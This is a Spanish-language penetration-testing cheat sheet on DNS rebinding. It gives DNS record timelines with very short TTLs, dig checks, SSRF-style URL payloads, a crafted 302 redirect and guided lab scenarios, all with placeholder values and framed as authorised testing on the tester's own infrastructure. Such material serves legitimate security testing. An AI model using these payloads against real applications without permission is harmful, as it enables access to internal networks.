# 🗡️ DNS rebinding: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Dominio propio con dos respuestas

```text
{DOMINIO_REBIND_PROPIO}  A  {IP_PUBLICA_PROPIA}      TTL=1
{DOMINIO_REBIND_PROPIO}  A  {IP_PRIVADA_LAB_PROPIA}  TTL=1 (después)
```

**Cuándo usarlo:** Cronología de respuestas, no archivo de zona. Las dos IP deben ser propias; un resolver puede imponer TTL mínimo o fijar resolución.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/DNS%20Rebinding/README.md).


### Observar resolución desde el cliente

```bash
dig {DOMINIO_REBIND_PROPIO} A +noall +answer
dig {DOMINIO_REBIND_PROPIO} AAAA +noall +answer
```

**Cuándo usarlo:** Estas consultas solo confirman el DNS de prueba, no que la aplicación sea vulnerable.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/DNS%20Rebinding/README.md).


## 🧭 Payloads por contexto

### URL entregada a un fetch permitido

```text
{"url":"http://{DOMINIO_REBIND_PROPIO}:{PUERTO_LAB}/canary"}
?callback=http://{DOMINIO_REBIND_PROPIO}:{PUERTO_LAB}/canary
```

**Cuándo usarlo:** Son alternativas. Registrar IP efectiva de la conexión en el servidor de laboratorio.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/ssrf).


## 🔥 Payloads avanzados

### Revalidación tras una redirección

```http
HTTP/1.1 302 Found
Location: http://{DOMINIO_REBIND_PROPIO}:{PUERTO_LAB}/segunda
Connection: close
Content-Length: 0
```

**Cuándo usarlo:** Tras servir este 302, cambiar el A del mismo dominio de IP pública propia a IP privada de laboratorio. Confirmar segunda resolución y conexión reales; el 302 aislado no prueba rebinding.

**Fuente:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).


## 🔬 Pruebas guiadas por escenario

### 1. Dos respuestas A de laboratorio

**Objetivo:** Observar cambio de respuesta DNS en dominio propio.

```bash
dig +short A {DOMINIO_REBIND_PROPIO}
sleep 3
dig +short A {DOMINIO_REBIND_PROPIO}
```

**Interpretación:** El cambio confirma configuración del laboratorio, no una vulnerabilidad de la aplicación.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/DNS%20Rebinding/README.md).

### 2. TTL de prueba

**Objetivo:** Comprobar que las respuestas del dominio de laboratorio tienen vida corta.

```bash
dig {DOMINIO_REBIND_PROPIO} A +noall +answer
```

**Interpretación:** Los resolvers pueden imponer TTL mínimo; registrar el valor real antes de atribuir comportamiento.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/DNS%20Rebinding/README.md).

### 3. Primera conexión pública

**Objetivo:** Enviar una URL cuyo DNS inicial apunta a un servidor propio.

```json
{"url":"http://{DOMINIO_REBIND_PROPIO}:{PUERTO_LAB}/canary"}
```

**Interpretación:** La primera respuesta debe llegar a un canary propio. No dirigir la segunda a redes ajenas.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/ssrf).

### 4. Segunda conexión a IP de laboratorio

**Objetivo:** Comprobar revalidación de IP al resolver de nuevo.

```text
DNS 1: {DOMINIO_REBIND_PROPIO} -> {IP_PUBLICA_PROPIA}
DNS 2: {DOMINIO_REBIND_PROPIO} -> {IP_PRIVADA_LAB_PROPIA}
```

**Interpretación:** Solo en laboratorio propio; observar conexión real a la segunda IP y controles de red.

**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).

### 5. Host HTTP conservado

**Objetivo:** Verificar que el cliente HTTP envía Host del nombre original.

```http
GET /canary HTTP/1.1
Host: {DOMINIO_REBIND_PROPIO}
```

**Interpretación:** El servidor del laboratorio debe registrar Host e IP local de destino; no confundirlo con DNS normal.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/ssrf).

### 6. Redirección y nueva resolución

**Objetivo:** Probar si el cliente vuelve a resolver el mismo dominio propio después de seguir un 302.

```text
302 Location: http://{DOMINIO_REBIND_PROPIO}:{PUERTO_LAB}/segunda
A antes del 302: {IP_PUBLICA_PROPIA}
A después del 302: {IP_PRIVADA_LAB_PROPIA}
```

**Interpretación:** Solo es rebinding si se observa una segunda consulta DNS y una conexión a la IP del laboratorio. Un 302 por sí solo no lo prueba.

**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).

### 7. Familias IPv4 e IPv6

**Objetivo:** Comprobar que el filtro resuelve y valida A y AAAA.

```bash
dig +short A {DOMINIO_REBIND_PROPIO}
dig +short AAAA {DOMINIO_REBIND_PROPIO}
```

**Interpretación:** Una familia no filtrada solo es relevante si la aplicación la conecta efectivamente.

**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
